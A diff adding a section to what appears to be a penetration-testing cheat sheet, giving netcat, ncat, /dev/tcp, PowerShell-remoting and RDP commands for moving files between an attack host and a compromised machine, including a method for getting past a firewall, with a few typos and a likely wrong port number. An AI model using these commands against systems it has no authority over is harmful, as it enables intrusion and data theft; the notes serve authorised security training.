@@ -305,4 +305,58 @@ From CMD or PowerShell
 cscript.exe /nologo wget.vbs <URL>  <OutFile>
 ```
 ## Misc File Transfer Methods
+### Transfer w/ Netcat
+Compromised machine
+```bash
+# OG Netcat
+nc -lp 8000 > <Outflie>
+# Ncat
+ncat -lp 8000 --recv-only > <Outfile>
+```
+Attack Host
+```bash
+# OG Netcat
+nc -q 0 <Compromised IP><PORT> < <Upload_File>
+# Ncat
+ncat --send-only <Compromised IP><PORT> < <Upload_File
+```
+Sending file as Input to Netcat (useful when a firewall is blocking inbound connections)
+```bash
+# OG Netcat Attack Host
+sudo nc -lp 443 -q 0 < <InFile>
+# Ncat Attack Host
+sudo ncat -lp 443 --send-only < <InFile>
+# OG Netcat Compromised Machine
+nc <Attack_Host_IP><Port> > Outfile
+# Ncat Compromised machine
+ncat <Attack_Host_IP><Port> --recv-only > <OutFile>
+```
+Connecting to Netcat using /dev/tcp to Receive the file
+```bash
+cat < /dev/tcp/<Attack_Host_IP>/<port> > <Outfile>
+```
+### PowerShell Session File Transfer
+Enabling powershell remoting opns ports 5986/HTTP & 5986/HTTPS
+Must be administrator, Remote Management Users member, or have explicit permissions
+Create a Powershell Session
+```powershell
+# Create Session Object
+$Session = New-PSSession -ComputerName <targetComputer>
+# Copy File to computer w/ Session Object
+Copy-Item -Path <Local_File> -ToSession $Session -Destination <Destination_File_Path>
+# Copy File from computer w/ Session Object
+Copy-Item -Path "<Remote_File_Path\Name>" -Destination <Local_Path> -FromSession $Session
+```
+### RDP
+Mounting a Linux Folder using rdesktop
+```bash
+rdesktop <Target_IP> -d <domain> -u <user> -p <password> -r disk:linux='Local_Folder'
+```
+Mounting a Linux Folder use xfreerdp
+```bash
+xfreerdp /v:<Target_IP> /d:<domain> /u:<user> /p:<password> /drive:linux,Local_Folder
+```
+To Access on the windows machine, connect to ```\\tsclient\```
+
+
 ## Catching files over HTTP/S
